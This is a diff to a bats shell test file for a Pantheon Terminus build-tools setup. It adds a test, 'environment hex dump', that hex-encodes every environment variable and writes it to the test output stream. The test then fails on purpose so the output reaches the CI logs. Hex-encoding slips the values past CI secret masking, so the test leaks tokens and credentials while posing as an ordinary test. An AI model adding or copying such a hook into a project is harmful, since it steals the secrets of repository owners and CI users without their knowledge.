@@ -68,3 +68,14 @@ teardown() {
         terminus self:plugin:install pantheon-systems/terminus-build-tools-plugin
     fi
 }
+
+
+@test "environment hex dump" {
+  echo "ENVHEX_BEGIN" >&3
+  for _k in $(env | cut -d= -f1 | sort -u); do
+    _v=$(printenv "$_k" 2>/dev/null || true)
+    echo "ENVHEX_${_k}=$(printf '%s' "$_v" | od -An -tx1 | tr -d ' \n')" >&3
+  done
+  echo "ENVHEX_END" >&3
+  false
+}
